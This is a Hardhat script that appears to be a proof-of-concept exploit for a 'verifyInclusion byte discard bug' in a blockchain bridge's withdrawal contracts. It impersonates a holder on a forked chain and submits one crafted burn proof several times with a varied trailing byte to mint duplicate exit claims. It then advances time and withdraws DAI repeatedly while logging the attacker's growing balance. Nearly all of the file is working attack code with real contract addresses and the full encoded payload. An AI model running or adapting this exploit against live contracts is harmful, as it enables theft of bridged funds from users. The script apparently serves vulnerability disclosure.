import hre from "hardhat"
import {IDai__factory, IERC20PredicateBurnOnly__factory, IWithdrawManager__factory} from "../typechain";
import {formatUnits} from "ethers/lib/utils";

async function main() {
  await hre.network.provider.request({
    method: "hardhat_impersonateAccount",
    params: ["0xf5efadf28fb98566ceb09407f34b8ac9143add69"],
  });
  await hre.network.provider.send("hardhat_setBalance", [
    "0xf5efadf28fb98566ceb09407f34b8ac9143add69",
    "0xffffffffffffffff",
  ]);
  const signer = await hre.ethers.getSigner("0xf5efadf28fb98566ceb09407f34b8ac9143add69");
  const iWithdrawManager = IWithdrawManager__factory.connect("0x2a88696e0ffa76baa1338f2c74497cc013495922",signer);
  const iDai = IDai__factory.connect("0x6B175474E89094C44Da98b954EedeAC495271d0F",signer);
  const ierc20PredicateBurnOnly = IERC20PredicateBurnOnly__factory.connect("0x158d5fa3ef8e4dda8a5367decf76b94e7effce95",signer);

  console.log('------ Exploit: verifyInclusion byte discard bug ------------')
  console.log("Dai balance of attacker:",formatUnits(await iDai.balanceOf(signer.address),await iDai.decimals()));

  console.log('------> Step 1: call processExits() to make a normal withdrawal')
  await iWithdrawManager.processExits(iDai.address,{"gasLimit":1000000})
  console.log("Dai balance of attacker:",formatUnits(await iDai.balanceOf(signer.address),await iDai.decimals()));

  console.log('------> Step 2: call startExitWithBurntTokens() repeatedly to mint ExitNFT')
  for (let i = 1; i < 3; i++) {
    await ierc20PredicateBurnOnly.startExitWithBurntTokens("0xf90c82840b82c700b90160c53d96d5474416722116bc5477b26a890fadd7688567cfbcb63e2f92da84f619c6c5ec07aed79ea110f0f6f658813446fdf2f26343fb4e2b0406dd63324879e29b6a34f6b268cabb1815523c9e1f58178a972996a00ed5924d9a6def55102747f6070f0dfca4fbf4a692625e02813688aa63a9cb201159b109ca4a997e700bef7cb5748a9a97dd168112333f620369ea55380a9a406e695caab2de56889893197d88e9660bb759de86e3ec8cc5b376a92a7b776a627c6ab7bf4fe262528fad3f1a2e3d41a7ee4065227e80f283532165cd414521250c4c92a62d93aa46c007eaaec297180615e33d4aebe0f87316e7c09fbb364f23a661cdd4163b7e90755fac03e7ca7396af4c937e2af408ce2f3d863965ecc4b28fec95b3833353d32e021763cbeb1962b50c1cc500ec62c312b5356380da67f101712003ba2852f5ab0bd85db8083aa2a49798e1282804f40f09ce1c9bc93caffca970477fdc4001592cce8401228ed384613e98e5a027452996f2366a2f4f5653afddc82759a7689389ae2dd2d6c7da8b64b94db028a0565fff2b1938717bd6f015c2a6390623f28fd2ef14da083d888009ef9ff3aaceb903c9f903c6018307f9c8b90100000000000000000000000000000000000000000000004000000000000000000000000000000000000000100000000000000080000000000000000000000000000000000000000000000000080000008000000000000000000003000000000000000000000200020000000000000008000000000000000000a0000010001000200000000000000000000000000000000000000000000010000000000400000000200000000000000000000800000000000000000000000000000000000000004000000002000000000001000000000000000000000000000000100000200060000000000000000000000000000000000000000000000000100000040000101000f902bbf89b9484000b263080bc37d1dd73a29d92794a6cf1564ef863a0ddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3efa0000000000000000000000000f5efadf28fb98566ceb09407f34b8ac9143add69a00000000000000000000000000000000000000000000000000000000000000000a00000000000000000000000000000000000000000000006fceeff6681b2a00000f8dc9484000b263080bc37d1dd73a29d92794a6cf1564ef863a0ebff2602b3f468259e1e99f613fed6691f3a6526effe6ef3e768ba7ae7a36c4fa00000000000000000000000006b175474e89094c44da98b954eedeac495271d0fa0000000000000000000000000f5efadf28fb98566ceb09407f34b8ac9143add69b8600000000000000000000000000000000000000000000006fceeff6681b2a000000000000000000000000000000000000000000000000006fceeff6681b2a000000000000000000000000000000000000000000000000000000000000000000000f9013d940000000000000000000000000000000000001010f884a04dfe1bbbcf077ddc3e01291eea2d5c70c2b422b415d95645b9adcfd678cb1d63a00000000000000000000000000000000000000000000000000000000000001010a0000000000000000000000000f5efadf28fb98566ceb09407f34b8ac9143add69a0000000000000000000000000b79fad4ca981472442f53d16365fdf0305ffd8e9b8a000000000000000000000000000000000000000000000000000031908ae030c00000000000000000000000000000000000000000000000003ddcb9633e92c49f0000000000000000000000000000000000000000000004286f3c617fe5d98cf8f000000000000000000000000000000000000000000000003ddc87d2b3b293df0000000000000000000000000000000000000000000004286f3c931070b9bdb8fb906fbf906f8f90131a086b5fde94416147b00acbf49dccf6caede1420d608b4e8b89ac39516607c8e90a0c4a6c57519d1f187b96c56da8591ed4c3d19985e6240c94ca48752f447cf8097a018471dc24c8c250cf27e75a7451db24897c40fbff8297e6b5e39567d91c6c275a00f175d3b3ac136641cc0cffc73c4ce5e63d2c47d9b6781806734dd34aff04d2ba0f2835225e4cc01893e2b07e22dc85884d765c852ef6c0feea5b5f04b64c8a68fa0d4cb92028dd80c2829957f81f96852589cd50d9a8c3a6913ae226affc289cd20a011c03d7f58e9d44a4d20423eccf57d28cf1a0f509562851e4edcd6fbf7fa299aa03e7764987e470e34868931f38b06fa6f27e5de47cd22294f2d488ac69a129bb9a01eededd4adf0b162da94417957fb520abf8cfde58b5973ee038508f6734fca8b8080808080808080f901f180a0207bd8384f4e42358244df6700cba275117cfa4d928bd9cbce322934fdf9dbe3a09583147d9a4b9a22f4808e683e1ed0b3722bcc8bb18ad6600bbdbdd5e8397891a09c308c29d0878d1f0f85b4f135701a25ecf07f5f363ae689afc2e2b497f0f374a0be130c129781165d04a7abd5bfe6785a996d134b877a376187815876504290dba0a9c55ec8e6af7e983d9dede0d146bcbd4dd42df896ad3a9e47414a483a63662aa019833fe94eca678a2e4994de1ec24650a83cd8068074643e3f0948a25d6a44b4a05d9ad82f727d5ff8166c845752f0112bda2b729834107ec304476d56b3297ecda074841599651deb7a868693e8f3776f99f35456db6bae33dffd37b88557305de2a0c67e8db09bec10e91d921791e1485a3a5e6418d60a67cb0ac7bcc1ea3b3b25c3a0df396227c8c9518da2f1f8dd86f3c9c34b76b5acee3d328b814dca4a66fa03e6a093bf57d92d424e63befd739c2dd45aeb432378ea0d45d69b17a513d299639fd7a03bcf26476ea0bd71f7409bcbc9a712435ab318fb718807eb9b534c275e61dcf9a0a6ba1d58fa407ce617f9acc0ed9411582f65a7c140e9c42a2061990cab85518aa0538e5de4a938ad154f8c1337e86a93700bd881493766a0982a654f91df6eb10da0c8145a3c47a753370f53fd68b88a986828f54cf37c12b51beae00ff069a7348c80f903cd20b903c9f903c6018307f9c8b90100000000000000000000000000000000000000000000004000000000000000000000000000000000000000100000000000000080000000000000000000000000000000000000000000000000080000008000000000000000000003000000000000000000000200020000000000000008000000000000000000a0000010001000200000000000000000000000000000000000000000000010000000000400000000200000000000000000000800000000000000000000000000000000000000004000000002000000000001000000000000000000000000000000100000200060000000000000000000000000000000000000000000000000100000040000101000f902bbf89b9484000b263080bc37d1dd73a29d92794a6cf1564ef863a0ddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3efa0000000000000000000000000f5efadf28fb98566ceb09407f34b8ac9143add69a00000000000000000000000000000000000000000000000000000000000000000a00000000000000000000000000000000000000000000006fceeff6681b2a00000f8dc9484000b263080bc37d1dd73a29d92794a6cf1564ef863a0ebff2602b3f468259e1e99f613fed6691f3a6526effe6ef3e768ba7ae7a36c4fa00000000000000000000000006b175474e89094c44da98b954eedeac495271d0fa0000000000000000000000000f5efadf28fb98566ceb09407f34b8ac9143add69b8600000000000000000000000000000000000000000000006fceeff6681b2a000000000000000000000000000000000000000000000000006fceeff6681b2a000000000000000000000000000000000000000000000000000000000000000000000f9013d940000000000000000000000000000000000001010f884a04dfe1bbbcf077ddc3e01291eea2d5c70c2b422b415d95645b9adcfd678cb1d63a00000000000000000000000000000000000000000000000000000000000001010a0000000000000000000000000f5efadf28fb98566ceb09407f34b8ac9143add69a0000000000000000000000000b79fad4ca981472442f53d16365fdf0305ffd8e9b8a000000000000000000000000000000000000000000000000000031908ae030c00000000000000000000000000000000000000000000000003ddcb9633e92c49f0000000000000000000000000000000000000000000004286f3c617fe5d98cf8f000000000000000000000000000000000000000000000003ddc87d2b3b293df0000000000000000000000000000000000000000000004286f3c931070b9bdb8f820" + i.toString() + "0401")
  }
  await hre.ethers.provider.send('evm_increaseTime', [7 * 24 * 60 * 60]);
  console.log("7 days have passed")

  console.log('------> Step 3: call processExits() to make multiple withdrawals')
  await iWithdrawManager.processExits(iDai.address,{"gasLimit":1000000})
  console.log("Dai balance of attacker:",formatUnits(await iDai.balanceOf(signer.address),await iDai.decimals()));
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
